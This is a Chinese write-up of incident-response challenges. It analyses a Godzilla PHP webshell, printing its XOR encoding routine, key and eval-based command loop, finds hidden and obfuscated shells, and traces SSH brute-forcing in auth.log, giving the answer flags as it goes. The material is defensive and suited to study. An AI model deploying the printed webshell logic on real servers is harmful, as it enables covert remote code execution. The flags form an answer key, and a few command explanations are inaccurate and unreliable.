+<h4 id="2-encode-函数定义"><a href="#2-encode-函数定义" class="headerlink" title="2. encode 函数定义"></a>2. <code>encode</code> 函数定义</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p><code>encode</code> 函数实现了一个简单的 XOR 加密算法。它使用一个密钥 <code>$K</code> 对数据 <code>$D</code> 中的每个字符进行 XOR 操作。</p>
+</li>
+<li><p><code>for($i=0;$i&lt;strlen($D);$i++) &#123; $c = $K[$i+1&amp;15]; &#125;</code>：对于每个字符，密钥 <code>$K</code> 被循环使用（每次通过 <code>&amp;15</code> 限制为 16 字符的循环）。</p>
+</li>
+<li><p><code>^</code> 是 XOR 操作符，用来将每个字符与密钥进行 XOR 加密&#x2F;解密。</p>
+<p>这个函数可以用来进行数据加密和解密，因为 XOR 操作具有对称性：即 <code>A^B^B = A</code>。</p>
+</li>
+</ul>
+<h4 id="3-数据获取与处理"><a href="#3-数据获取与处理" class="headerlink" title="3. 数据获取与处理"></a>3. 数据获取与处理</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$payloadName</code> 设置为 <code>payload</code>，这是一个用来存储加密数据的会话变量名。</li>
+<li><code>$key</code> 是用来加密和解密的密钥。</li>
+<li><code>$data</code> 获取来自 HTTP 请求的原始输入数据（<code>php://input</code>），这个数据通常是 POST 请求的内容。</li>
+</ul>
+<h4 id="4-数据加密与会话检查"><a href="#4-数据加密与会话检查" class="headerlink" title="4. 数据加密与会话检查"></a>4. 数据加密与会话检查</h4><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ol>
+<li><strong>数据处理</strong>：<ul>
+<li>如果 <code>$data</code> 不是 <code>false</code>，说明读取到请求体中的数据，接着对其进行加密（<code>$data = encode($data, $key)</code>）。</li>
+</ul>
+</li>
+<li><strong>会话存在检查</strong>：<ul>
+<li>如果会话中有 <code>payload</code>（即 <code>$_SESSION[$payloadName]</code> 存在），则对会话中的 <code>payload</code> 进行解密。</li>
+<li>然后判断 <code>payload</code> 中是否包含 <code>getBasicsInfo</code> 字符串。如果没有，就对 <code>payload</code> 再次进行加密。这看起来像是某种数据完整性校验，确保 <code>payload</code> 中没有受到篡改。</li>
+</ul>
+</li>
+<li><strong><code>eval()</code> 执行动态代码</strong>：<ul>
+<li><code>eval($payload);</code>：这个函数会执行 <code>$payload</code> 变量中的 PHP 代码。这里是潜在的安全漏洞，因为如果 <code>payload</code> 经过篡改或不受信任的输入，它可能会导致任意代码执行。</li>
+</ul>
+</li>
+<li><strong>执行数据与返回</strong>：<ul>
+<li><code>echo encode(@run($data),$key);</code>：执行加密后的 <code>$data</code>（通过 <code>@run($data)</code>），然后将结果加密后返回。</li>
+<li><code>@run()</code> 可能是一个自定义函数，但由于代码中没有提供该函数的定义，不能完全确定它的实现。</li>
+</ul>
+</li>
+<li><strong>会话存储</strong>：<ul>
+<li>如果会话中没有 <code>payload</code>，且 <code>$data</code> 中包含 <code>getBasicsInfo</code> 字符串，则将 <code>$data</code> 加密并存储在会话中，作为后续请求的基础数据。</li>
+</ul>
+</li>
+</ol>
+<h4 id="5-潜在的安全问题"><a href="#5-潜在的安全问题" class="headerlink" title="5. 潜在的安全问题"></a>5. 潜在的安全问题</h4><ul>
+<li><strong><code>eval()</code> 的使用</strong>：<code>eval()</code> 用于执行动态生成的 PHP 代码，如果 <code>payload</code> 数据不安全或来自不信任的用户输入，就可能导致远程代码执行漏洞（RCE）。这可以让攻击者在服务器上执行任意 PHP 代码，极为危险。</li>
+<li><strong>数据加密与解密</strong>：虽然数据经过加密，但使用相同的密钥进行加解密，这可能并不足够防止攻击。加密的实现方式相对简单，也容易被攻击者通过某些手段恢复密钥。</li>
+<li><strong>错误隐蔽</strong>：通过 <code>@error_reporting(0)</code> 关闭错误报告，这意味着如果出现错误，攻击者很难发现漏洞的存在。</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该 PHP 脚本看起来是设计用来处理通过 HTTP 请求传入的加密数据，并使用 <code>eval()</code> 执行传入的 PHP 代码。虽然加密数据可能看起来增加了安全性，但其对 <code>eval()</code> 函数的使用，以及错误报告的抑制，使得它很容易成为远程代码执行的攻击目标。使用 <code>eval()</code> 执行动态代码是一个严重的安全隐患，建议避免这种做法。</p>
+</blockquote>
+<p>flag:<code>flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</code></p>
+<h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><blockquote>
+<p>黑客使用的什么工具的shell github地址的md5 flag{md5}</p>
+</blockquote>
+<p>遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；</p>
+<p>为什么这样说？</p>
+<p>哥斯拉病毒是一种Java后门木马，通常用于攻击并控制<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">Web服务器</a>。特征就包括：</p>
+<blockquote>
+<ol>
+<li><strong>@session_start();</strong> - 开启一个会话。</li>
+<li><strong>@set_time_limit(0);</strong> - 设置脚本执行时间为无限。</li>
+<li><strong>@error_reporting(0);</strong> - 关闭所有错误报告。</li>
+</ol>
+</blockquote>
+<p>这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。</p>
+<p>所以我们只需要找到它的github地址并且进行MD5加密即可；</p>
+<blockquote>
+<p>Godzilla地址：<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
+</blockquote>
+<p>md5加密一下</p>
+<p>flag:<code>flag&#123;39392DE3218C333F794BEFEF07AC9257&#125;</code></p>
+<h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><blockquote>
+<p>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</p>
+</blockquote>
+<p><img src="https://picx.zhimg.com/80/v2-f22b3eb28c713e7d9507ac12aedccb94_1440w.png?source=d16d100b"></p>
+<p>那既然说黑客隐藏shell了，那我们肯定需要用到命令<code>ls -la</code>进行查找；上面那个就很像</p>
+<p>然后发现在挨个查找的过程中发现<code>.Mysqlli.php</code>如果普通的ls查看目录是查不出来的，必须用到<code>ls -la</code>才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；</p>
+<blockquote>
+<p>路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php</p>
+</blockquote>
+<p>flag:<code>flag&#123;AEBAC0E58CD6C5FAD1695EE4D1AC1919&#125;</code></p>
+<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><blockquote>
+<p>黑客免杀马完整路径 md5 flag{md5}</p>
+</blockquote>
+<p>免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。</p>
+<blockquote>
+<p>&#x3D;&#x3D;常见的免杀技术&#x3D;&#x3D;:</p>
+<p>代码混淆：</p>
+<p>   使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。</p>
+<p>编码和加密：</p>
+<p>   使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。</p>
+<p>动态生成和执行：</p>
+<p>   通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。</p>
+<p>多层解码：</p>
+<p>   多层编码或加密，增加分析和检测的难度。</p>
+<p>使用合法函数：</p>
+<p>   恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。<br>&#x3D;&#x3D;查找和处理免杀马的方法&#x3D;&#x3D;</p>
+<p>文件完整性检查：</p>
+<p>   比较当前文件与已知的良性备份文件，发现被修改或新增的文件。</p>
+<p>代码审查：</p>
+<p>   手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。</p>
+<p>安全扫描工具：</p>
+<p>   使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。</p>
+<p>日志分析：</p>
+<p>   查看服务器访问日志和错误日志，寻找异常访问和执行模式。<br>   检查文件修改时间，与正常更新周期不符的文件可能是可疑的。</p>
+<p>基于特征的检测：</p>
+<p>   使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。</p>
+<blockquote>
+<p>总结：免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在&#x2F;var&#x2F;log目录下。</p>
+</blockquote>
+</blockquote>
+<p>既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。</p>
+<p>我们到apache2目录下面查看一下access.log日志，查看分析一下；（因为是日志所以记录有点多）</p>
+<p>大部分都是重复的只有少数不一样的；</p>
+<p>我们可以看到有个名为top.php的文件执行了<code>phpinfo()</code>；且返回值为&#x3D;&#x3D;200&#x3D;&#x3D;，有点可疑。去找到相对应的文件发现是一个正常的文件</p>
+<p>继续往下翻，又发现一个较为可疑的文件，到此目录下面查看该文件。</p>
+<p>目录：<code>/wap/top.php</code></p>
+<p><img src="https://pic1.zhimg.com/80/v2-a21b1e081f42ab40cb58c21384352eae_1440w.jpg?source=d16d100b"></p>
+<p>可以看到这段代码是具有前面做免杀的特征，这里采用了异或，编码混淆，还有动态调用的方法。后面的func2是能够结合生成assert进行动态调用的代码执行的。</p>
+<p>可以判断是个恶意文件，最后把路径进行md5进行加密即可；</p>
+<blockquote>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php</p>
+</blockquote>
+<p>flag:<code>flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</code></p>
+<h1 id="第一章-应急响应-Linux日志分析"><a href="#第一章-应急响应-Linux日志分析" class="headerlink" title="第一章 应急响应-Linux日志分析"></a>第一章 应急响应-Linux日志分析</h1><blockquote>
+<p>简介</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">账号root密码linuxrz</span><br><span class="line">ssh root@IP</span><br><span class="line">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割</span><br><span class="line">2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割</span><br><span class="line">3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割</span><br><span class="line">4.登陆成功的IP共爆破了多少次</span><br><span class="line">5.黑客登陆主机后新建了一个后门用户，用户名是多少</span><br></pre></td></tr></table></figure></div></blockquote>
+<h2 id="步骤1-1"><a href="#步骤1-1" class="headerlink" title="步骤1"></a>步骤1</h2><blockquote>
+<p>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}</p>
+</blockquote>
+<p>在Linux系统中，SSH登录尝试的日志通常记录在<code>/var/log/auth.log</code>或者<code>/var/log/secure</code>文件中</p>
+<p><img src="https://pic1.zhimg.com/80/v2-725210ba38a3cee6bbab2df9268e62f1_1440w.png"></p>
+<blockquote>
+<p><code>auth.log</code> 和 <code>auth.log.1</code> 的区别在于：</p>
+<ul>
+<li><strong><code>auth.log</code></strong> 是当前正在记录的认证相关日志文件，系统的身份验证信息（如登录、sudo、ssh连接等）实时写入这个文件。</li>
+<li><strong><code>auth.log.1</code></strong> 是前一个周期的认证日志的归档文件，是系统在日志轮转（log rotation）后生成的备份。</li>
+</ul>
+<h3 id="日志轮转机制（logrotate）简介："><a href="#日志轮转机制（logrotate）简介：" class="headerlink" title="日志轮转机制（logrotate）简介："></a>日志轮转机制（logrotate）简介：</h3><p>系统为了避免单个日志文件无限增大，会定期（比如每天、每周等）把旧日志重命名为 <code>.1</code>、<code>.2.gz</code> 等归档版本，并创建一个新的空日志文件继续记录。</p>
+<p>例如：</p>
+<ul>
+<li><code>auth.log</code>：今天或这次轮转之后的日志。</li>
+<li><code>auth.log.1</code>：上一个周期的日志内容。</li>
+<li>如果有 <code>auth.log.2.gz</code>，那就是更久之前的，通常已经压缩归档。</li>
+</ul>
+<hr>
+<h3 id="怎么用它们？"><a href="#怎么用它们？" class="headerlink" title="怎么用它们？"></a>怎么用它们？</h3><ul>
+<li>查看当前登录、权限相关行为：<code>cat /var/log/auth.log</code></li>
+<li>查看历史认证行为（比如昨天或前几天的）：<code>cat /var/log/auth.log.1</code> 或 <code>zcat /var/log/auth.log.2.gz</code></li>
+</ul>
+<p>如果你想调试 ssh 登录、sudo 行为、安全问题，<code>auth.log</code> 系列是重点。</p>
+</blockquote>
+<p>所以我们看<code>auth.log.1</code></p>
+<p><img src="https://pic1.zhimg.com/80/v2-627ac4bf8381f5c9811d4ceae6ca059b_1440w.png"></p>
+<p>首先要记得我们需要的是爆破主机ssh的root账号。</p>
+<p>我们这里可以用命令筛选一下。</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span></span><br><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password <span class="keyword">for</span> root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password <span class="keyword">for</span> root from 192.168.200.31 port 40364 ssh2</span><br></pre></td></tr></table></figure></div>
+
+<p>这里参考一下Peterpan师傅的命令：</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure></div>
+
+<p>解释</p>
+<blockquote>
+<p>这个命令用于分析 Linux 系统中 <code>/var/log/auth.log.1</code> 文件里关于 root 用户登录失败的记录。我们来一步步拆解和分析这条命令：</p>
+<hr>
+<h3 id="完整命令："><a href="#完整命令：" class="headerlink" title="完整命令："></a>完整命令：</h3><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h3 id="各部分含义："><a href="#各部分含义：" class="headerlink" title="各部分含义："></a>各部分含义：</h3><ol>
+<li><strong><code>cat auth.log.1</code></strong></li>
+</ol>
+<ul>
+<li>读取日志文件 <code>auth.log.1</code> 的内容（通常是旧的认证日志）。</li>
+</ul>
+<ol start="2">
+<li><strong><code>grep -a &quot;Failed password for root&quot;</code></strong></li>
+</ol>
+<ul>
+<li>过滤出包含 <code>&quot;Failed password for root&quot;</code> 的行，这些行表示 root 用户尝试登录但密码错误。</li>
+<li><code>-a</code> 是让 grep 把二进制文件当作文本文件处理（有时日志中可能包含非文本字符）。</li>
+</ul>
+<ol start="3">
+<li><strong><code>awk &#39;&#123;print $11&#125;&#39;</code></strong></li>
+</ol>
+<ul>
+<li><p>从每一行中提取第 11 列，一般是登录尝试的 IP 地址。</p>
+</li>
+<li><p>举个例子：</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apr  2 10:20:10 server sshd[12345]: Failed password for root from 192.168.0.123 port 51854 ssh2</span><br></pre></td></tr></table></figure></div>
+
+<p>第11列就是 IP：<code>192.168.0.123</code></p>
+</li>
+</ul>
+<ol start="4">
+<li><strong><code>sort</code></strong></li>
+</ol>
+<ul>
+<li>对提取出来的 IP 地址进行排序（为后面的去重计数做准备）。</li>
+</ul>
+<ol start="5">
+<li><strong><code>uniq -c</code></strong></li>
+</ol>
+<ul>
+<li>对相邻的相同 IP 计数，输出格式如：<code>5 192.168.0.123</code>，表示这个 IP 出现了 5 次。</li>
+</ul>
+<ol start="6">
+<li><strong><code>sort -nr</code></strong></li>
+</ol>
+<ul>
+<li>按照数量从大到小排序（n：数字，r：倒序），可以看到哪些 IP 尝试最多。</li>
+</ul>
+<ol start="7">
+<li><strong><code>more</code></strong></li>
+</ol>
+<ul>
+<li>分页显示，便于查看大量结果。</li>
+</ul>
+<hr>
+<h3 id="最终效果："><a href="#最终效果：" class="headerlink" title="最终效果："></a>最终效果：</h3><p>你会得到一个<strong>按尝试次数排序的 IP 列表</strong>，比如：</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">20 192.168.1.10</span><br><span class="line">15 10.0.0.5</span><br><span class="line">7  203.0.113.45</span><br></pre></td></tr></table></figure></div>
+
+<p>这些 IP 都是在尝试暴力破解 root 用户密码，尝试次数越多，危险性可能越高。</p>
+<hr>
+<h3 id="实用建议："><a href="#实用建议：" class="headerlink" title="实用建议："></a>实用建议：</h3><ul>
+<li>可以根据这些 IP 做封禁，例如使用 <code>iptables</code> 或 <code>fail2ban</code>。</li>
+<li>建议禁用 root 用户远程 SSH 登录，或者启用密钥认证，提高系统安全性。</li>
+</ul>
+</blockquote>
+<p><code>awk</code> 是一个文本处理工具，用于按字段处理文本。</p>
+<p><code>&#123;print $11&#125;</code> 表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。</p>
+<p><code>sort</code> 命令用于对输入行进行排序 。<code>uniq</code> 命令用于删除重复的行，<code>-c</code> 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。</p>
+<blockquote>
+<p>在Mash1r0看到一点小汇总，收藏一下：</p>
+<p>这些命令，在这个环境作用不大，但是对于日志非常多的环境是很有用的，可以进行参考一下。</p>
+<ul>
+<li><p><strong>sort -nr</strong>: <code>sort</code> 命令再次用于排序。<code>-n</code> 选项表示按数值进行排序。<code>-r</code> 选项表示按降序排序。组合起来，即按出现次数从高到低排序。</p>
+</li>
+<li><p><code>more</code> 命令用于分页显示输出。由于输出可能很长，<code>more</code> 命令允许用户逐页查看结果。</p>
+</li>
+</ul>
+</blockquote>
+<p>所以flag:<code>flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</code></p>
+<h2 id="步骤2-1"><a href="#步骤2-1" class="headerlink" title="步骤2"></a>步骤2</h2><blockquote>
+<p>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</p>
+</blockquote>
+<p>这个命令不也就和前面类似了，我们先找到成功登录的模版。然后筛选即可。</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Accepted password for root&quot;</span> | awk <span class="string">&#x27;&#123;print$11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      2 192.168.200.2</span><br></pre></td></tr></table></figure></div>
+
+<p>所以flag:<code>flag&#123;192.168.200.2&#125;</code></p>
+<h2 id="步骤3-1"><a href="#步骤3-1" class="headerlink" title="步骤3"></a>步骤3</h2><blockquote>
+<p>3.爆破用户名字典是什么？如果有多个使用”,”分割</p>
+</blockquote>
+<p>我们要找到爆破的字典，肯定是还要做筛选的命令，Failed和Accepted的筛选肯定必不可少，我们需要找到所有尝试过的用户名。</p>
+<p>我们先找到一个模版再进行筛选。</p>
+<p><code>Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2</code></p>
+<p>可以看到user后面的hello用户名这个关键字在第11个字段。然后看了一下成功登录的并没有其他用户，只有root。</p>
+<div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Accepted&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      1 Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">      1 Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="命令1"><a href="#命令1" class="headerlink" title="命令1"></a>命令1</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# cat auth.log.1 | grep -aoP &quot;Failed password for invalid user(.*)from&quot; | uniq -c | sort -r</span><br><span class="line">      5 Failed password for invalid user user from</span><br><span class="line">      5 Failed password for invalid user hello from</span><br><span class="line">      5 Failed password for invalid user  from</span><br><span class="line">      1 Failed password for invalid user test3 from</span><br><span class="line">      1 Failed password for invalid user test2 from</span><br><span class="line">      1 Failed password for invalid user test1 from</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的grep的有关参数如下：</p>
+<ul>
+<li><code>-o</code>：只输出匹配的部分。</li>
+<li><code>-P</code>：使用 Perl 兼容的正则表达式</li>
+</ul>
+<p>sort -t是降序的意思。</p>
+<p>然后会匹配到中间用户名的部分。</p>
+<h3 id="命令2"><a href="#命令2" class="headerlink" title="命令2"></a>命令2</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# cat auth.log.1 | grep -a &quot;Failed password&quot; |perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure></div>
+
+<p>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139560740">玄机——第一章 应急响应-Linux日志分析 wp</a></p>
+<p>所以flag:<code>flag&#123;user,hello,root,test3,test2,test1&#125;</code></p>
+<h2 id="步骤4-1"><a href="#步骤4-1" class="headerlink" title="步骤4"></a>步骤4</h2><blockquote>
+<p>4.成功登录 root 用户的 ip 一共爆破了多少次</p>
+</blockquote>
+<p>直接参考第一次命令的次数就行了</p>
